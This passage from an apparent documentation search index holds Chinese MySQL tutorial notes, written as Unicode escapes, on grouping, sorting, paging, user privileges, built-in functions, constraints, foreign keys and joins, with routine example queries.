<code>SELECT \u805a\u5408\u51fd\u6570(\u5b57\u6bb5\u5217\u8868) FROM \u8868\u540d;</code> \u4f8b\uff1a <code>SELECT count(id) from employee where workaddress = \"\u5e7f\u4e1c\u7701\";</code></p>"},{"location":"program/2024-04-22-MYSQL/#_12","title":"\u5206\u7ec4\u67e5\u8be2","text":"<p>\u8bed\u6cd5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d [ WHERE \u6761\u4ef6 ] GROUP BY \u5206\u7ec4\u5b57\u6bb5\u540d [ HAVING \u5206\u7ec4\u540e\u7684\u8fc7\u6ee4\u6761\u4ef6 ];</code> </p> <p>where \u548c having \u7684\u533a\u522b\uff1a</p> <ul> <li>\u6267\u884c\u65f6\u673a\u4e0d\u540c\uff1awhere\u662f\u5206\u7ec4\u4e4b\u524d\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4e0d\u6ee1\u8db3where\u6761\u4ef6\u4e0d\u53c2\u4e0e\u5206\u7ec4\uff1bhaving\u662f\u5206\u7ec4\u540e\u5bf9\u7ed3\u679c\u8fdb\u884c\u8fc7\u6ee4\u3002</li> <li>\u5224\u65ad\u6761\u4ef6\u4e0d\u540c\uff1awhere\u4e0d\u80fd\u5bf9\u805a\u5408\u51fd\u6570\u8fdb\u884c\u5224\u65ad\uff0c\u800chaving\u53ef\u4ee5\u3002</li> </ul> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u6839\u636e\u6027\u522b\u5206\u7ec4\uff0c\u7edf\u8ba1\u7537\u6027\u548c\u5973\u6027\u6570\u91cf\uff08\u53ea\u663e\u793a\u5206\u7ec4\u6570\u91cf\uff0c\u4e0d\u663e\u793a\u54ea\u4e2a\u662f\u7537\u54ea\u4e2a\u662f\u5973\uff09\nselect count(*) from employee group by gender;\n-- \u6839\u636e\u6027\u522b\u5206\u7ec4\uff0c\u7edf\u8ba1\u7537\u6027\u548c\u5973\u6027\u6570\u91cf\nselect gender, count(*) from employee group by gender;\n-- \u6839\u636e\u6027\u522b\u5206\u7ec4\uff0c\u7edf\u8ba1\u7537\u6027\u548c\u5973\u6027\u7684\u5e73\u5747\u5e74\u9f84\nselect gender, avg(age) from employee group by gender;\n-- \u5e74\u9f84\u5c0f\u4e8e45\uff0c\u5e76\u6839\u636e\u5de5\u4f5c\u5730\u5740\u5206\u7ec4\nselect workaddress, count(*) from employee where age &lt; 45 group by workaddress;\n-- \u5e74\u9f84\u5c0f\u4e8e45\uff0c\u5e76\u6839\u636e\u5de5\u4f5c\u5730\u5740\u5206\u7ec4\uff0c\u83b7\u53d6\u5458\u5de5\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e3\u7684\u5de5\u4f5c\u5730\u5740\nselect workaddress, count(*) address_count from employee where age &lt; 45 group by workaddress having address_count &gt;= 3;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_13","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u6267\u884c\u987a\u5e8f\uff1awhere &gt; \u805a\u5408\u51fd\u6570 &gt; having</li> <li>\u5206\u7ec4\u4e4b\u540e\uff0c\u67e5\u8be2\u7684\u5b57\u6bb5\u4e00\u822c\u4e3a\u805a\u5408\u51fd\u6570\u548c\u5206\u7ec4\u5b57\u6bb5\uff0c\u67e5\u8be2\u5176\u4ed6\u5b57\u6bb5\u65e0\u4efb\u4f55\u610f\u4e49</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_14","title":"\u6392\u5e8f\u67e5\u8be2","text":"<p>\u8bed\u6cd5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d ORDER BY \u5b57\u6bb51 \u6392\u5e8f\u65b9\u5f0f1, \u5b57\u6bb52 \u6392\u5e8f\u65b9\u5f0f2;</code></p> <p>\u6392\u5e8f\u65b9\u5f0f\uff1a</p> <ul> <li>ASC: \u5347\u5e8f\uff08\u9ed8\u8ba4\uff09</li> <li>DESC: \u964d\u5e8f</li> </ul> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u6839\u636e\u5e74\u9f84\u5347\u5e8f\u6392\u5e8f\nSELECT * FROM employee ORDER BY age ASC;\nSELECT * FROM employee ORDER BY age;\n-- \u4e24\u5b57\u6bb5\u6392\u5e8f\uff0c\u6839\u636e\u5e74\u9f84\u5347\u5e8f\u6392\u5e8f\uff0c\u5165\u804c\u65f6\u95f4\u964d\u5e8f\u6392\u5e8f(\u5982\u679c\u5e74\u9f84\u76f8\u540c\u90a3\u4e48\u5c31\u6309\u8fd9\u4e2a)\nSELECT * FROM employee ORDER BY age ASC, entrydate DESC;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_15","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>\u5982\u679c\u662f\u591a\u5b57\u6bb5\u6392\u5e8f\uff0c\u5f53\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u503c\u76f8\u540c\u65f6\uff0c\u624d\u4f1a\u6839\u636e\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\u8fdb\u884c\u6392\u5e8f</p>"},{"location":"program/2024-04-22-MYSQL/#_16","title":"\u5206\u9875\u67e5\u8be2","text":"<p>\u8bed\u6cd5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d LIMIT \u8d77\u59cb\u7d22\u5f15, \u67e5\u8be2\u8bb0\u5f55\u6570;</code> </p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u7b2c\u4e00\u9875\u6570\u636e\uff0c\u5c55\u793a10\u6761\nSELECT * FROM employee LIMIT 0, 10;\n-- \u67e5\u8be2\u7b2c\u4e8c\u9875\nSELECT * FROM employee LIMIT 10, 10;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_17","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u8d77\u59cb\u7d22\u5f15\u4ece0\u5f00\u59cb\uff0c\u8d77\u59cb\u7d22\u5f15 = \uff08\u67e5\u8be2\u9875\u7801 - 1\uff09 * \u6bcf\u9875\u663e\u793a\u8bb0\u5f55\u6570</li> <li>\u5206\u9875\u67e5\u8be2\u662f\u6570\u636e\u5e93\u7684\u65b9\u8a00\uff0c\u4e0d\u540c\u6570\u636e\u5e93\u6709\u4e0d\u540c\u5b9e\u73b0\uff0cMySQL\u662fLIMIT</li> <li>\u5982\u679c\u67e5\u8be2\u7684\u662f\u7b2c\u4e00\u9875\u6570\u636e\uff0c\u8d77\u59cb\u7d22\u5f15\u53ef\u4ee5\u7701\u7565\uff0c\u76f4\u63a5\u7b80\u5199 LIMIT 10</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#dql_1","title":"DQL\u6267\u884c\u987a\u5e8f","text":"<p>FROM -&gt; WHERE -&gt; GROUP BY -&gt; SELECT -&gt; ORDER BY -&gt; LIMIT</p>"},{"location":"program/2024-04-22-MYSQL/#dcl","title":"DCL","text":""},{"location":"program/2024-04-22-MYSQL/#_18","title":"\u7ba1\u7406\u7528\u6237","text":"<p>\u67e5\u8be2\u7528\u6237\uff1a</p> MySQL<pre><code>USER mysql;\nSELECT * FROM user;\n</code></pre> <p>\u521b\u5efa\u7528\u6237: <code>CREATE USER '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d' IDENTIFIED BY '\u5bc6\u7801';</code></p> <p>\u4fee\u6539\u7528\u6237\u5bc6\u7801\uff1a <code>ALTER USER '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d' IDENTIFIED WITH mysql_native_password BY '\u65b0\u5bc6\u7801';</code></p> <p>\u5220\u9664\u7528\u6237\uff1a <code>DROP USER '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d';</code></p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u521b\u5efa\u7528\u6237test\uff0c\u53ea\u80fd\u5728\u5f53\u524d\u4e3b\u673alocalhost\u8bbf\u95ee\ncreate user 'test'@'localhost' identified by '123456';\n-- \u521b\u5efa\u7528\u6237test\uff0c\u80fd\u5728\u4efb\u610f\u4e3b\u673a\u8bbf\u95ee\ncreate user 'test'@'%' identified by '123456';\ncreate user 'test' identified by '123456';\n-- \u4fee\u6539\u5bc6\u7801\nalter user 'test'@'localhost' identified with mysql_native_password by '1234';\n-- \u5220\u9664\u7528\u6237\ndrop user 'test'@'localhost';\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_19","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u4e3b\u673a\u540d\u53ef\u4ee5\u4f7f\u7528 % \u901a\u914d</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_20","title":"\u6743\u9650\u63a7\u5236","text":"<p>\u5e38\u7528\u6743\u9650\uff1a</p> \u6743\u9650 \u8bf4\u660e ALL, ALL PRIVILEGES \u6240\u6709\u6743\u9650 SELECT \u67e5\u8be2\u6570\u636e INSERT \u63d2\u5165\u6570\u636e UPDATE \u4fee\u6539\u6570\u636e DELETE \u5220\u9664\u6570\u636e ALTER \u4fee\u6539\u8868 DROP \u5220\u9664\u6570\u636e\u5e93/\u8868/\u89c6\u56fe CREATE \u521b\u5efa\u6570\u636e\u5e93/\u8868 <p>\u66f4\u591a\u6743\u9650\u8bf7\u770b\u6743\u9650\u4e00\u89c8\u8868 </p> <p>\u67e5\u8be2\u6743\u9650\uff1a <code>SHOW GRANTS FOR '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d';</code></p> <p>\u6388\u4e88\u6743\u9650\uff1a <code>GRANT \u6743\u9650\u5217\u8868 ON \u6570\u636e\u5e93\u540d.\u8868\u540d TO '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d';</code></p> <p>\u64a4\u9500\u6743\u9650\uff1a <code>REVOKE \u6743\u9650\u5217\u8868 ON \u6570\u636e\u5e93\u540d.\u8868\u540d FROM '\u7528\u6237\u540d'@'\u4e3b\u673a\u540d';</code></p>"},{"location":"program/2024-04-22-MYSQL/#_21","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u591a\u4e2a\u6743\u9650\u7528\u9017\u53f7\u5206\u9694</li> <li>\u6388\u6743\u65f6\uff0c\u6570\u636e\u5e93\u540d\u548c\u8868\u540d\u53ef\u4ee5\u7528 * \u8fdb\u884c\u901a\u914d\uff0c\u4ee3\u8868\u6240\u6709</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_22","title":"\u51fd\u6570","text":"<p>\u51fd\u6570  \u662f\u6307\u4e00\u6bb5\u53ef\u4ee5\u76f4\u63a5\u88ab\u53e6\u5916\u4e00\u6bb5\u7a0b\u5e8f\u8c03\u7528\u7684\u7a0b\u5e8f\u6216\u4ee3\u7801\u3002</p> <ul> <li>\u5b57\u7b26\u4e32\u51fd\u6570</li> <li>\u6570\u503c\u51fd\u6570</li> <li>\u65e5\u671f\u51fd\u6570</li> <li>\u6d41\u7a0b\u51fd\u6570</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_23","title":"\u5b57\u7b26\u4e32\u51fd\u6570","text":"<p>\u5e38\u7528\u51fd\u6570\uff1a</p> \u51fd\u6570 \u529f\u80fd CONCAT(s1, s2, ..., sn) \u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u5c06s1, s2, ..., sn\u62fc\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32 LOWER(str) \u5c06\u5b57\u7b26\u4e32\u5168\u90e8\u8f6c\u4e3a\u5c0f\u5199 UPPER(str) \u5c06\u5b57\u7b26\u4e32\u5168\u90e8\u8f6c\u4e3a\u5927\u5199 LPAD(str, n, pad) \u5de6\u586b\u5145\uff0c\u7528\u5b57\u7b26\u4e32pad\u5bf9str\u7684\u5de6\u8fb9\u8fdb\u884c\u586b\u5145\uff0c\u8fbe\u5230n\u4e2a\u5b57\u7b26\u4e32\u957f\u5ea6 RPAD(str, n, pad) \u53f3\u586b\u5145\uff0c\u7528\u5b57\u7b26\u4e32pad\u5bf9str\u7684\u53f3\u8fb9\u8fdb\u884c\u586b\u5145\uff0c\u8fbe\u5230n\u4e2a\u5b57\u7b26\u4e32\u957f\u5ea6 TRIM(str) \u53bb\u6389\u5b57\u7b26\u4e32\u5934\u90e8\u548c\u5c3e\u90e8\u7684\u7a7a\u683c SUBSTRING(str, start, len) \u8fd4\u56de\u4ece\u5b57\u7b26\u4e32str\u4ecestart\u4f4d\u7f6e\u8d77\u7684len\u4e2a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32 <p>\u4f7f\u7528\u793a\u4f8b\uff1a</p> MySQL<pre><code>-- \u62fc\u63a5\nSELECT CONCAT('Hello', 'World');\n-- \u5c0f\u5199\nSELECT LOWER('Hello');\n-- \u5927\u5199\nSELECT UPPER('Hello');\n-- \u5de6\u586b\u5145\nSELECT LPAD('01', 5, '-');\n-- \u53f3\u586b\u5145\nSELECT RPAD('01', 5, '-');\n-- \u53bb\u9664\u7a7a\u683c\nSELECT TRIM(' Hello World ');\n-- \u5207\u7247\uff08\u8d77\u59cb\u7d22\u5f15\u4e3a1\uff09\nSELECT SUBSTRING('Hello World', 1, 5);\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_24","title":"\u6570\u503c\u51fd\u6570","text":"<p>\u5e38\u89c1\u51fd\u6570\uff1a</p> \u51fd\u6570 \u529f\u80fd CEIL(x) \u5411\u4e0a\u53d6\u6574 FLOOR(x) \u5411\u4e0b\u53d6\u6574 MOD(x, y) \u8fd4\u56dex/y\u7684\u6a21 RAND() \u8fd4\u56de0~1\u5185\u7684\u968f\u673a\u6570 ROUND(x, y) \u6c42\u53c2\u6570x\u7684\u56db\u820d\u4e94\u5165\u503c\uff0c\u4fdd\u7559y\u4f4d\u5c0f\u6570"},{"location":"program/2024-04-22-MYSQL/#_25","title":"\u65e5\u671f\u51fd\u6570","text":"<p>\u5e38\u7528\u51fd\u6570\uff1a</p> \u51fd\u6570 \u529f\u80fd CURDATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f CURTIME() \u8fd4\u56de\u5f53\u524d\u65f6\u95f4 NOW() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 YEAR(date) \u83b7\u53d6\u6307\u5b9adate\u7684\u5e74\u4efd MONTH(date) \u83b7\u53d6\u6307\u5b9adate\u7684\u6708\u4efd DAY(date) \u83b7\u53d6\u6307\u5b9adate\u7684\u65e5\u671f DATE_ADD(date, INTERVAL expr type) \u8fd4\u56de\u4e00\u4e2a\u65e5\u671f/\u65f6\u95f4\u503c\u52a0\u4e0a\u4e00\u4e2a\u65f6\u95f4\u95f4\u9694expr\u540e\u7684\u65f6\u95f4\u503c DATEDIFF(date1, date2) \u8fd4\u56de\u8d77\u59cb\u65f6\u95f4date1\u548c\u7ed3\u675f\u65f6\u95f4date2\u4e4b\u95f4\u7684\u5929\u6570 <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- DATE_ADD\nSELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_26","title":"\u6d41\u7a0b\u51fd\u6570","text":"<p>\u5e38\u7528\u51fd\u6570\uff1a</p> \u51fd\u6570 \u529f\u80fd IF(value, t, f) \u5982\u679cvalue\u4e3atrue\uff0c\u5219\u8fd4\u56det\uff0c\u5426\u5219\u8fd4\u56def IFNULL(value1, value2) \u5982\u679cvalue1\u4e0d\u4e3a\u7a7a\uff0c\u8fd4\u56devalue1\uff0c\u5426\u5219\u8fd4\u56devalue2 CASE WHEN [ val1 ] THEN [ res1 ] ... ELSE [ default ] END \u5982\u679cval1\u4e3atrue\uff0c\u8fd4\u56deres1\uff0c... \u5426\u5219\u8fd4\u56dedefault\u9ed8\u8ba4\u503c CASE [ expr ] WHEN [ val1 ] THEN [ res1 ] ... ELSE [ default ] END \u5982\u679cexpr\u7684\u503c\u7b49\u4e8eval1\uff0c\u8fd4\u56deres1\uff0c... \u5426\u5219\u8fd4\u56dedefault\u9ed8\u8ba4\u503c <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>select\n    name,\n    (case when age &gt; 30 then '\u4e2d\u5e74' else '\u9752\u5e74' end)\nfrom employee;\nselect\n    name,\n    (case workaddress when '\u5317\u4eac\u5e02' then '\u4e00\u7ebf\u57ce\u5e02' when '\u4e0a\u6d77\u5e02' then '\u4e00\u7ebf\u57ce\u5e02' else '\u4e8c\u7ebf\u57ce\u5e02' end) as '\u5de5\u4f5c\u5730\u5740'\nfrom employee;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_27","title":"\u7ea6\u675f","text":"<ol> <li>\u6982\u5ff5\uff1a\u7ea6\u675f\u662f\u7528\u6765\u4f5c\u7528\u4e8e\u8868\u4e2d\u5b57\u6bb5\u4e0a\u7684\u89c4\u5219\uff0c\u7528\u4e8e\u9650\u5236\u5b58\u50a8\u5728\u8868\u4e2d\u7684\u6570\u636e\u3002</li> <li>\u76ee\u7684\uff1a\u4fdd\u8bc1\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u7684\u6b63\u786e\u3001\u6709\u6548\u6027\u548c\u5b8c\u6574\u6027</li> </ol> <p>\u5206\u7c7b\uff1a</p> \u7ea6\u675f \u63cf\u8ff0 \u5173\u952e\u5b57 \u975e\u7a7a\u7ea6\u675f \u9650\u5236\u8be5\u5b57\u6bb5\u7684\u6570\u636e\u4e0d\u80fd\u4e3anull NOT NULL \u552f\u4e00\u7ea6\u675f \u4fdd\u8bc1\u8be5\u5b57\u6bb5\u7684\u6240\u6709\u6570\u636e\u90fd\u662f\u552f\u4e00\u3001\u4e0d\u91cd\u590d\u7684 UNIQUE \u4e3b\u952e\u7ea6\u675f \u4e3b\u952e\u662f\u4e00\u884c\u6570\u636e\u7684\u552f\u4e00\u6807\u8bc6\uff0c\u8981\u6c42\u975e\u7a7a\u4e14\u552f\u4e00 PRIMARY KEY \u9ed8\u8ba4\u7ea6\u675f \u4fdd\u5b58\u6570\u636e\u65f6\uff0c\u5982\u679c\u672a\u6307\u5b9a\u8be5\u5b57\u6bb5\u7684\u503c\uff0c\u5219\u91c7\u7528\u9ed8\u8ba4\u503c DEFAULT \u68c0\u67e5\u7ea6\u675f\uff088.0.1\u7248\u672c\u540e\uff09 \u4fdd\u8bc1\u5b57\u6bb5\u503c\u6ee1\u8db3\u67d0\u4e00\u4e2a\u6761\u4ef6 CHECK \u5916\u952e\u7ea6\u675f \u7528\u6765\u8ba9\u4e24\u5f20\u56fe\u7684\u6570\u636e\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u548c\u5b8c\u6574\u6027 FOREIGN KEY <p>\u7ea6\u675f\u662f\u4f5c\u7528\u4e8e\u8868\u4e2d\u5b57\u6bb5\u4e0a\u7684\uff0c\u53ef\u4ee5\u518d\u521b\u5efa\u8868/\u4fee\u6539\u8868\u7684\u65f6\u5019\u6dfb\u52a0\u7ea6\u675f\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_28","title":"\u5e38\u7528\u7ea6\u675f","text":"\u7ea6\u675f\u6761\u4ef6 \u5173\u952e\u5b57 \u4e3b\u952e PRIMARY KEY \u81ea\u52a8\u589e\u957f AUTO_INCREMENT \u4e0d\u4e3a\u7a7a NOT NULL \u552f\u4e00 UNIQUE \u903b\u8f91\u6761\u4ef6 CHECK \u9ed8\u8ba4\u503c DEFAULT <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>create table user(\n    id int primary key auto_increment,\n    name varchar(10) not null unique,\n    age int check(age &gt; 0 and age &lt; 120),\n    status char(1) default '1',\n    gender char(1)\n);\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_29","title":"\u5916\u952e\u7ea6\u675f","text":"<p>\u5916\u952e\u7528\u6765\u8ba9\u4e24\u5f20\u8868\u7684\u6570\u636e\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u4ece\u800c\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u548c\u5b8c\u6574\u6027\u3002</p> <p>\u6dfb\u52a0\u5916\u952e\uff1a</p> MySQL<pre><code>CREATE TABLE \u8868\u540d(\n    \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b,\n    ...\n    [CONSTRAINT] [\u5916\u952e\u540d\u79f0] FOREIGN KEY(\u5916\u952e\u5b57\u6bb5\u540d) REFERENCES \u4e3b\u8868(\u4e3b\u8868\u5217\u540d)\n);  \nALTER TABLE \u8868\u540d ADD CONSTRAINT \u5916\u952e\u540d\u79f0 FOREIGN KEY (\u5916\u952e\u5b57\u6bb5\u540d) REFERENCES \u4e3b\u8868(\u4e3b\u8868\u5217\u540d);\n\n-- \u4f8b\u5b50  \nalter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);  \n</code></pre> <p>\u5220\u9664\u5916\u952e\uff1a <code>ALTER TABLE \u8868\u540d DROP FOREIGN KEY \u5916\u952e\u540d;</code> </p>"},{"location":"program/2024-04-22-MYSQL/#_30","title":"\u5220\u9664/\u66f4\u65b0\u884c\u4e3a","text":"\u884c\u4e3a \u8bf4\u660e NO ACTION \u5f53\u5728\u7236\u8868\u4e2d\u5220\u9664/\u66f4\u65b0\u5bf9\u5e94\u8bb0\u5f55\u65f6\uff0c\u9996\u5148\u68c0\u67e5\u8be5\u8bb0\u5f55\u662f\u5426\u6709\u5bf9\u5e94\u5916\u952e\uff0c\u5982\u679c\u6709\u5219\u4e0d\u5141\u8bb8\u5220\u9664/\u66f4\u65b0\uff08\u4e0eRESTRICT\u4e00\u81f4\uff09 RESTRICT \u5f53\u5728\u7236\u8868\u4e2d\u5220\u9664/\u66f4\u65b0\u5bf9\u5e94\u8bb0\u5f55\u65f6\uff0c\u9996\u5148\u68c0\u67e5\u8be5\u8bb0\u5f55\u662f\u5426\u6709\u5bf9\u5e94\u5916\u952e\uff0c\u5982\u679c\u6709\u5219\u4e0d\u5141\u8bb8\u5220\u9664/\u66f4\u65b0\uff08\u4e0eNO ACTION\u4e00\u81f4\uff09 CASCADE \u5f53\u5728\u7236\u8868\u4e2d\u5220\u9664/\u66f4\u65b0\u5bf9\u5e94\u8bb0\u5f55\u65f6\uff0c\u9996\u5148\u68c0\u67e5\u8be5\u8bb0\u5f55\u662f\u5426\u6709\u5bf9\u5e94\u5916\u952e\uff0c\u5982\u679c\u6709\u5219\u4e5f\u5220\u9664/\u66f4\u65b0\u5916\u952e\u5728\u5b50\u8868\u4e2d\u7684\u8bb0\u5f55 SET NULL \u5f53\u5728\u7236\u8868\u4e2d\u5220\u9664/\u66f4\u65b0\u5bf9\u5e94\u8bb0\u5f55\u65f6\uff0c\u9996\u5148\u68c0\u67e5\u8be5\u8bb0\u5f55\u662f\u5426\u6709\u5bf9\u5e94\u5916\u952e\uff0c\u5982\u679c\u6709\u5219\u8bbe\u7f6e\u5b50\u8868\u4e2d\u8be5\u5916\u952e\u503c\u4e3anull\uff08\u8981\u6c42\u8be5\u5916\u952e\u5141\u8bb8\u4e3anull\uff09 SET DEFAULT \u7236\u8868\u6709\u53d8\u66f4\u65f6\uff0c\u5b50\u8868\u5c06\u5916\u952e\u8bbe\u4e3a\u4e00\u4e2a\u9ed8\u8ba4\u503c\uff08Innodb\u4e0d\u652f\u6301\uff09 <p>\u66f4\u6539\u5220\u9664/\u66f4\u65b0\u884c\u4e3a\uff1a <code>ALTER TABLE \u8868\u540d ADD CONSTRAINT \u5916\u952e\u540d\u79f0 FOREIGN KEY (\u5916\u952e\u5b57\u6bb5) REFERENCES \u4e3b\u8868\u540d(\u4e3b\u8868\u5b57\u6bb5\u540d) ON UPDATE \u884c\u4e3a ON DELETE \u884c\u4e3a;</code> </p>"},{"location":"program/2024-04-22-MYSQL/#_31","title":"\u591a\u8868\u67e5\u8be2","text":""},{"location":"program/2024-04-22-MYSQL/#_32","title":"\u591a\u8868\u5173\u7cfb","text":"<ul> <li>\u4e00\u5bf9\u591a\uff08\u591a\u5bf9\u4e00\uff09</li> <li>\u591a\u5bf9\u591a</li> <li>\u4e00\u5bf9\u4e00</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_33","title":"\u4e00\u5bf9\u591a","text":"<p>\u6848\u4f8b\uff1a\u90e8\u95e8\u4e0e\u5458\u5de5 \u5173\u7cfb\uff1a\u4e00\u4e2a\u90e8\u95e8\u5bf9\u5e94\u591a\u4e2a\u5458\u5de5\uff0c\u4e00\u4e2a\u5458\u5de5\u5bf9\u5e94\u4e00\u4e2a\u90e8\u95e8 \u5b9e\u73b0\uff1a\u5728\u591a\u7684\u4e00\u65b9\u5efa\u7acb\u5916\u952e\uff0c\u6307\u5411\u4e00\u7684\u4e00\u65b9\u7684\u4e3b\u952e  </p>"},{"location":"program/2024-04-22-MYSQL/#_34","title":"\u591a\u5bf9\u591a","text":"<p>\u6848\u4f8b\uff1a\u5b66\u751f\u4e0e\u8bfe\u7a0b \u5173\u7cfb\uff1a\u4e00\u4e2a\u5b66\u751f\u53ef\u4ee5\u9009\u591a\u95e8\u8bfe\u7a0b\uff0c\u4e00\u95e8\u8bfe\u7a0b\u4e5f\u53ef\u4ee5\u4f9b\u591a\u4e2a\u5b66\u751f\u9009\u4fee \u5b9e\u73b0\uff1a\u5efa\u7acb\u7b2c\u4e09\u5f20\u4e2d\u95f4\u8868\uff0c\u4e2d\u95f4\u8868\u81f3\u5c11\u5305\u542b\u4e24\u4e2a\u5916\u952e\uff0c\u5206\u522b\u5173\u8054\u4e24\u65b9\u4e3b\u952e  </p>"},{"location":"program/2024-04-22-MYSQL/#_35","title":"\u4e00\u5bf9\u4e00","text":"<p>\u6848\u4f8b\uff1a\u7528\u6237\u4e0e\u7528\u6237\u8be6\u60c5 \u5173\u7cfb\uff1a\u4e00\u5bf9\u4e00\u5173\u7cfb\uff0c\u591a\u7528\u4e8e\u5355\u8868\u62c6\u5206\uff0c\u5c06\u4e00\u5f20\u8868\u7684\u57fa\u7840\u5b57\u6bb5\u653e\u5728\u4e00\u5f20\u8868\u4e2d\uff0c\u5176\u4ed6\u8be6\u60c5\u5b57\u6bb5\u653e\u5728\u53e6\u4e00\u5f20\u8868\u4e2d\uff0c\u4ee5\u63d0\u5347\u64cd\u4f5c\u6548\u7387 \u5b9e\u73b0\uff1a\u5728\u4efb\u610f\u4e00\u65b9\u52a0\u5165\u5916\u952e\uff0c\u5173\u8054\u53e6\u5916\u4e00\u65b9\u7684\u4e3b\u952e\uff0c\u5e76\u4e14\u8bbe\u7f6e\u5916\u952e\u4e3a\u552f\u4e00\u7684\uff08UNIQUE\uff09  </p>"},{"location":"program/2024-04-22-MYSQL/#_36","title":"\u67e5\u8be2","text":"<p>\u5408\u5e76\u67e5\u8be2\uff08\u7b1b\u5361\u5c14\u79ef\uff0c\u4f1a\u5c55\u793a\u6240\u6709\u7ec4\u5408\u7ed3\u679c\uff09\uff1a <code>select * from employee, dept;</code> </p> <p>\u7b1b\u5361\u5c14\u79ef\uff1a\u4e24\u4e2a\u96c6\u5408A\u96c6\u5408\u548cB\u96c6\u5408\u7684\u6240\u6709\u7ec4\u5408\u60c5\u51b5\uff08\u5728\u591a\u8868\u67e5\u8be2\u65f6\uff0c\u9700\u8981\u6d88\u9664\u65e0\u6548\u7684\u7b1b\u5361\u5c14\u79ef\uff09  </p> <p>\u6d88\u9664\u65e0\u6548\u7b1b\u5361\u5c14\u79ef\uff1a <code>select * from employee, dept where employee.dept = dept.id;</code> </p>"},{"location":"program/2024-04-22-MYSQL/#_37","title":"\u5185\u8fde\u63a5\u67e5\u8be2","text":"<p>\u5185\u8fde\u63a5\u67e5\u8be2\u7684\u662f\u4e24\u5f20\u8868\u4ea4\u96c6\u7684\u90e8\u5206</p> <p>\u9690\u5f0f\u5185\u8fde\u63a5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u88681, \u88682 WHERE \u6761\u4ef6 ...;</code> </p> <p>\u663e\u5f0f\u5185\u8fde\u63a5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u88681 [ INNER ] JOIN \u88682 ON \u8fde\u63a5\u6761\u4ef6 ...;</code> </p> <p>\u663e\u5f0f\u6027\u80fd\u6bd4\u9690\u5f0f\u9ad8</p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u5458\u5de5\u59d3\u540d\uff0c\u53ca\u5173\u8054\u7684\u90e8\u95e8\u7684\u540d\u79f0\n-- \u9690\u5f0f\nselect e.name, d.name from employee as e, dept as d where e.dept = d.id;\n-- \u663e\u5f0f\nselect e.name, d.name from employee as e inner join dept as d on e.dept = d.id;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_38","title":"\u5916\u8fde\u63a5\u67e5\u8be2","text":"<p>\u5de6\u5916\u8fde\u63a5\uff1a \u67e5\u8be2\u5de6\u8868\u6240\u6709\u6570\u636e\uff0c\u4ee5\u53ca\u4e24\u5f20\u8868\u4ea4\u96c6\u90e8\u5206\u6570\u636e <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u88681 LEFT [ OUTER ] JOIN \u88682 ON \u6761\u4ef6 ...;</code> \u76f8\u5f53\u4e8e\u67e5\u8be2\u88681\u7684\u6240\u6709\u6570\u636e\uff0c\u5305\u542b\u88681\u548c\u88682\u4ea4\u96c6\u90e8\u5206\u6570\u636e  </p> <p>\u53f3\u5916\u8fde\u63a5\uff1a \u67e5\u8be2\u53f3\u8868\u6240\u6709\u6570\u636e\uff0c\u4ee5\u53ca\u4e24\u5f20\u8868\u4ea4\u96c6\u90e8\u5206\u6570\u636e <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u88681 RIGHT 